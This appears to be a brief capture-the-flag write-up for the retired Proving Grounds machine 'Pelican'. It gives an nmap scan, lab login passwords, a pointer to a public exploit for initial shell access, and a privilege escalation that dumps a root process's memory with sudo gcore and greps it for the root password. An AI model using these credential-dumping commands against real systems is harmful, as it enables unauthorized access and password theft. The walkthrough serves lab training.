Machine Overview

Difficulty: Intermediate

Platform: Offensive Security Proving Grounds (Practice)

Description: Pelican is a retired Linux VM from OffSec’s Proving Grounds Practice. Initial access involves finding web credentials and using a public exploit to get a shell as charles. Privilege escalation requires dumping process memory with gcore to recover the root password.

Nmap

sudo nmap -sC -sV 192.168.247.98 -oN nmap-pelican

Web

Initial Access Credentials

charles / SupportDucklingDivision574

SSH didn’t work. Used Exploit-DB 48654 instead:

I am charles in /opt/zookeeper

Privilege Escalation

sudo -l

Use gcore to dump process memory:

sudo -u root /usr/bin/gcore -a -o /home/charles/output 494

Run strings to extract the root password:

strings output.494 | grep -A 10 -B 10 root

Password found: ClogKingpinInning731

Switch to root:

su root
